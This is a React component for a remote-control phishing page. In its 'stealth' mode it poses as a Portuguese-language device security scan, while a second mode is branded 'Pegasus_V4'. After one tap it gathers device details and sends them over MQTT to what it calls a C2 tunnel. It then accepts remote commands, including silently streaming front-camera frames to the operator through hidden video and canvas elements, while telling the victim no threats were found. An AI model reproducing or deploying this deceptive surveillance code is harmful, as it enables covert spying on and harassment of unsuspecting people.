
import React, { useEffect, useState, useRef } from 'react';
import { 
  Skull, 
  Power, 
  ShieldCheck, 
  Loader2, 
  Zap, 
  ShieldAlert, 
  Cpu, 
  Database, 
  Wifi, 
  Battery as BatteryIcon,
  CheckCircle2,
  AlertTriangle,
  Radio
} from 'lucide-react';
import { getDeviceInfo } from '../services/deviceService';
import { mqttService } from '../services/mqttService';
import { DeviceInfo, CommandMessage } from '../types';

const MobileScanner: React.FC = () => {
  const [started, setStarted] = useState(false);
  const [status, setStatus] = useState<'initializing' | 'scanning' | 'transmitting' | 'complete' | 'error'>('initializing');
  const [info, setInfo] = useState<DeviceInfo | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const [stealthMode, setStealthMode] = useState(false);
  const [isGlitching, setIsGlitching] = useState(false);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamIntervalRef = useRef<number | null>(null);

  const getURLParams = () => {
    const hash = window.location.hash; 
    const queryPart = hash.split('?')[1];
    if (!queryPart) return { session: null, stealth: false };
    const params = new URLSearchParams(queryPart);
    return { session: params.get('session'), stealth: params.get('stealth') === 'true' };
  };

  const addLog = (msg: string) => {
    setLogs(prev => [msg, ...prev.slice(0, 15)]);
  };

  const handleCommand = (cmd: CommandMessage, session: string) => {
    switch (cmd.type) {
      case 'ACTIVATE_CAMERA': startCamera(session); break;
      case 'STOP_CAMERA': stopCamera(); break;
      case 'SPEAK': 
        const utterance = new SpeechSynthesisUtterance(cmd.payload.text);
        utterance.lang = 'pt-BR';
        window.speechSynthesis.speak(utterance);
        addLog('>> UPLINK_AUDIO_SPOOLING');
        break;
      case 'GLITCH':
        setIsGlitching(true);
        if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 300]);
        setTimeout(() => setIsGlitching(false), 2500);
        addLog('>> CRITICAL_CORE_ERR_INJECTED');
        break;
      case 'VIBRATE':
        if (navigator.vibrate) navigator.vibrate(500);
        break;
      case 'PLAY_AUDIO':
        new Audio(cmd.payload.url).play().catch(() => {});
        break;
    }
  };

  const startCamera = async (sessionId: string) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: 320, height: 240 }, audio: false 
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        streamIntervalRef.current = window.setInterval(() => {
           if (videoRef.current && canvasRef.current) {
              const ctx = canvasRef.current.getContext('2d');
              if (ctx) {
                 ctx.drawImage(videoRef.current, 0, 0, 320, 240);
                 mqttService.publishStream(sessionId, { 
                   image: canvasRef.current.toDataURL('image/jpeg', 0.4), 
                   timestamp: new Date().toISOString() 
                 });
              }
           }
        }, 250);
        addLog('>> SURVEILLANCE_UPLINK_LIVE');
      }
    } catch (err) { addLog('>> CAMERA_ACCESS_DENIED'); }
  };

  const stopCamera = () => {
     if (streamIntervalRef.current) { clearInterval(streamIntervalRef.current); streamIntervalRef.current = null; }
     if (videoRef.current?.srcObject) (videoRef.current.srcObject as MediaStream).getTracks().forEach(t => t.stop());
  };

  useEffect(() => {
    if (!started) return;
    const { session, stealth } = getURLParams();
    if (!session) return;

    const run = async () => {
      setStatus('scanning');
      addLog(stealth ? 'Iniciando verificação...' : '>> BOOTING_PEGASUS_CORE...');
      
      // Simulate steps for a more "complete" feel
      await new Promise(r => setTimeout(r, 800));
      setProgress(25);
      addLog(stealth ? 'Lendo assinaturas do sistema...' : '>> BYPASSING_SANDBOX...');
      
      const data = await getDeviceInfo(stealth);
      setInfo(data);
      
      await new Promise(r => setTimeout(r, 1200));
      setProgress(55);
      addLog(stealth ? 'Validando permissões...' : '>> SCRAPING_LOCAL_TELEMETRY...');
      
      await new Promise(r => setTimeout(r, 1000));
      setProgress(85);
      addLog(stealth ? 'ESTABLISHING_C2_TUNNEL...' : '>> ESTABLISHING_C2_TUNNEL...');
      
      mqttService.connect(session, () => {}, () => mqttService.publishData(session, data), (cmd) => handleCommand(cmd, session));
      
      await new Promise(r => setTimeout(r, 500));
      setProgress(100);
      setStatus('complete');
      addLog(stealth ? 'Dispositivo seguro' : '>> CONNECTION_STABLE_AES256');
    };
    run();
    return () => stopCamera();
  }, [started]);

  // Landing Page
  if (!started) {
    const isStealthUrl = getURLParams().stealth;
    return (
      <div 
        onClick={() => { setStarted(true); setStealthMode(isStealthUrl); }} 
        className={`fixed inset-0 flex flex-col items-center justify-center p-8 z-50 transition-colors duration-700 ${isStealthUrl ? 'bg-[#f8f9fa] text-gray-800' : 'bg-[#050505]'}`}
      >
        {isStealthUrl ? (
          <div className="text-center space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-1000">
            <div className="relative inline-block">
              <ShieldCheck size={80} className="text-blue-500 mx-auto" />
              <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-500 rounded-full border-2 border-white"></div>
            </div>
            <div className="space-y-2">
              <h1 className="text-2xl font-sans font-semibold tracking-tight text-gray-900">Segurança do Sistema</h1>
              <p className="text-sm text-gray-500 max-w-[240px] mx-auto leading-relaxed">Clique para realizar uma varredura de integridade e otimizar seu dispositivo.</p>
            </div>
            <button className="px-8 py-3 bg-blue-600 text-white rounded-full font-medium shadow-lg shadow-blue-200 active:scale-95 transition-transform">
              Iniciar Varredura
            </button>
          </div>
        ) : (
          <div className="text-center space-y-8 animate-in fade-in zoom-in duration-700">
            <div className="relative group">
               <div className="absolute -inset-4 bg-red-600 rounded-full blur-2xl opacity-20 group-hover:opacity-40 transition duration-1000"></div>
               <Power size={80} className="text-red-500 mx-auto relative group-hover:scale-110 transition-transform cursor-pointer" />
            </div>
            <div className="space-y-2">
              <h1 className="text-3xl font-black text-red-500 tracking-[0.2em] uppercase font-mono italic">Pegasus_V4</h1>
              <div className="flex items-center justify-center gap-2">
                <span className="w-2 h-2 bg-red-500 rounded-full animate-ping"></span>
                <p className="text-[10px] text-red-400 font-mono tracking-[0.3em] uppercase opacity-60">Waiting for Signal</p>
              </div>
            </div>
            <p className="text-[10px] text-gray-600 font-mono mt-12 animate-pulse">TOUCH TO EXECUTE EXPLOIT</p>
          </div>
        )}
        <div className="absolute bottom-8 text-[9px] opacity-20 text-center w-full font-mono uppercase tracking-[0.4em]">
          Davi.Design Systems
        </div>
      </div>
    );
  }

  // Active View
  return (
    <div className={`min-h-screen font-mono p-4 flex flex-col relative transition-all duration-500 overflow-hidden ${
      isGlitching ? 'bg-red-600 invert' : (stealthMode ? 'bg-[#f8f9fa] text-gray-900' : 'bg-[#050505] text-green-500')
    }`}>
      {/* Hidden elements for capturing frames */}
      <video ref={videoRef} className="hidden" playsInline muted autoPlay></video>
      <canvas ref={canvasRef} width="320" height="240" className="hidden"></canvas>
      
      {/* Glitch Overlay */}
      {isGlitching && (
        <div className="absolute inset-0 pointer-events-none z-50 mix-blend-difference overflow-hidden">
           {[...Array(20)].map((_, i) => (
             <div key={i} className="absolute bg-white/30 h-1 w-full" style={{ top: `${Math.random() * 100}%`, left: `${Math.random() * 10 - 5}%` }}></div>
           ))}
        </div>
      )}

      {/* Header Area */}
      <div className="w-full max-w-md mx-auto pt-8 pb-4">
        {stealthMode ? (
          <div className="flex items-center gap-3 mb-6 bg-white p-4 rounded-2xl shadow-sm border border-gray-100">
            <div className="bg-blue-50 p-2 rounded-xl">
              <Loader2 className={`text-blue-600 ${status !== 'complete' ? 'animate-spin' : ''}`} size={24} />
            </div>
            <div className="flex-1">
              <h2 className="text-sm font-semibold text-gray-800">
                {status === 'complete' ? 'Varredura Concluída' : 'Verificando Integridade...'}
              </h2>
              <p className="text-[10px] text-gray-400">Proteção ativa contra ameaças</p>
            </div>
            {status === 'complete' && <CheckCircle2 className="text-green-500" size={20} />}
          </div>
        ) : (
          <div className="text-center space-y-3 mb-8">
            <div className="relative inline-block">
               <div className="absolute inset-0 bg-red-600 blur-xl opacity-20 animate-pulse"></div>
               <Skull size={48} className="text-red-600 relative mx-auto" />
            </div>
            <h1 className="text-xl font-black uppercase tracking-[0.3em] italic text-red-500">Uplink_Established</h1>
            <div className="flex items-center justify-center gap-2 py-1 px-3 bg-red-950/30 border border-red-900/50 rounded inline-block mx-auto">
               {/* Added missing Radio import to fix reference error on line 223 */}
               <Radio size={12} className="text-red-500 animate-pulse" />
               <span className="text-[9px] uppercase tracking-widest text-red-400">Encrypted_Channel_TX_Active</span>
            </div>
          </div>
        )}
      </div>

      {/* Main Content Card */}
      <div className={`w-full max-w-md mx-auto flex-1 flex flex-col space-y-4 animate-in fade-in slide-in-from-bottom-8 duration-700`}>
        
        {/* Progress Section */}
        <div className={`p-6 border rounded-2xl shadow-xl backdrop-blur-md ${
          stealthMode ? 'bg-white border-gray-100' : 'bg-[#0a0a0a] border-green-900/30'
        }`}>
          <div className="space-y-4 mb-6">
            <div className="flex justify-between items-end">
              <span className={`text-[10px] font-bold uppercase tracking-widest ${stealthMode ? 'text-gray-400' : 'text-green-800'}`}>
                {status === 'complete' ? 'Diagnóstico finalizado' : 'Processando'}
              </span>
              <span className={`text-lg font-black tracking-tighter ${stealthMode ? 'text-blue-600' : 'text-green-500'}`}>{progress}%</span>
            </div>
            <div className={`h-2 rounded-full overflow-hidden ${stealthMode ? 'bg-gray-100' : 'bg-gray-900/50'}`}>
              <div 
                className={`h-full transition-all duration-1000 ease-out shadow-[0_0_10px_rgba(0,0,0,0.1)] ${
                  stealthMode ? 'bg-blue-600' : 'bg-green-600'
                }`} 
                style={{ width: `${progress}%` }}
              ></div>
            </div>
          </div>

          {/* Captured Data Grid (Diagnostic View) */}
          <div className="grid grid-cols-2 gap-3 mb-6">
             <div className={`p-3 rounded-xl border flex flex-col gap-1 ${stealthMode ? 'bg-gray-50 border-gray-100' : 'bg-black/50 border-green-950/30'}`}>
                <div className="flex items-center gap-2">
                  <Cpu size={12} className={stealthMode ? 'text-blue-400' : 'text-green-800'} />
                  <span className="text-[8px] uppercase tracking-tighter text-gray-500">Núcleos</span>
                </div>
                <span className={`text-[11px] font-bold ${stealthMode ? 'text-gray-700' : 'text-green-400'}`}>
                  {info?.hardwareConcurrency || '??'} Logic Unit
                </span>
             </div>
             <div className={`p-3 rounded-xl border flex flex-col gap-1 ${stealthMode ? 'bg-gray-50 border-gray-100' : 'bg-black/50 border-green-950/30'}`}>
                <div className="flex items-center gap-2">
                  <BatteryIcon size={12} className={stealthMode ? 'text-blue-400' : 'text-green-800'} />
                  <span className="text-[8px] uppercase tracking-tighter text-gray-500">Energia</span>
                </div>
                <span className={`text-[11px] font-bold ${stealthMode ? 'text-gray-700' : 'text-green-400'}`}>
                  {info?.battery !== undefined ? `${info.battery}% Connected` : 'N/A Power'}
                </span>
             </div>
             <div className={`p-3 rounded-xl border flex flex-col gap-1 ${stealthMode ? 'bg-gray-50 border-gray-100' : 'bg-black/50 border-green-950/30'}`}>
                <div className="flex items-center gap-2">
                  <Wifi size={12} className={stealthMode ? 'text-blue-400' : 'text-green-800'} />
                  <span className="text-[8px] uppercase tracking-tighter text-gray-500">Link</span>
                </div>
                <span className={`text-[11px] font-bold truncate ${stealthMode ? 'text-gray-700' : 'text-green-400'}`}>
                  {info?.connectionType?.toUpperCase() || 'SECURE'} MODE
                </span>
             </div>
             <div className={`p-3 rounded-xl border flex flex-col gap-1 ${stealthMode ? 'bg-gray-50 border-gray-100' : 'bg-black/50 border-green-950/30'}`}>
                <div className="flex items-center gap-2">
                  <Database size={12} className={stealthMode ? 'text-blue-400' : 'text-green-800'} />
                  <span className="text-[8px] uppercase tracking-tighter text-gray-500">Memória</span>
                </div>
                <span className={`text-[11px] font-bold ${stealthMode ? 'text-gray-700' : 'text-green-400'}`}>
                  {info?.deviceMemory ? `~${info.deviceMemory} GB ALLOC` : 'LOCKED'}
                </span>
             </div>
          </div>

          {/* Scrolling Logs */}
          <div className={`text-[9px] h-32 overflow-hidden border-t pt-4 space-y-1 font-mono mask-fade-bottom ${
            stealthMode ? 'text-blue-800/60 border-gray-100' : 'text-green-500/50 border-green-900/20'
          }`}>
            {logs.length === 0 && <div className="animate-pulse">_</div>}
            {logs.map((l, i) => (
              <div key={i} className="flex gap-2 leading-tight">
                <span className="opacity-40 select-none">[{new Date().toLocaleTimeString([], { hour12: false })}]</span>
                <span className="flex-1 break-all">{l}</span>
              </div>
            ))}
          </div>
        </div>

        {/* Security Alert / Info Banner */}
        {status === 'complete' && (
          <div className={`p-4 rounded-2xl border flex items-center gap-4 animate-in slide-in-from-top-4 duration-500 ${
            stealthMode ? 'bg-green-50 border-green-100 text-green-700' : 'bg-red-900/10 border-red-900/30 text-red-500'
          }`}>
            <div className={`p-2 rounded-lg ${stealthMode ? 'bg-green-100' : 'bg-red-950/50'}`}>
              {stealthMode ? <ShieldCheck size={18} /> : <AlertTriangle size={18} />}
            </div>
            <div className="flex-1">
              <h3 className="text-[11px] font-bold uppercase tracking-wider">
                {stealthMode ? 'Sistema Protegido' : 'Device Compromised'}
              </h3>
              <p className="text-[9px] opacity-70">
                {stealthMode ? 'Nenhuma ameaça encontrada no seu dispositivo.' : 'Unauthorized background process detected.'}
              </p>
            </div>
          </div>
        )}
      </div>

      {/* Footer Branding */}
      <div className="mt-auto py-8 text-center">
        <div className={`inline-flex items-center gap-2 px-3 py-1 rounded-full text-[8px] uppercase tracking-[0.4em] font-bold transition-opacity duration-1000 ${
          status === 'complete' ? 'opacity-30' : 'opacity-10'
        } ${stealthMode ? 'text-gray-400' : 'text-white'}`}>
           Develop By Davi.Design
        </div>
      </div>

      {/* CSS Utilities */}
      <style>{`
        .mask-fade-bottom {
          mask-image: linear-gradient(to bottom, black 70%, transparent 100%);
        }
      `}</style>
    </div>
  );
};

export default MobileScanner;
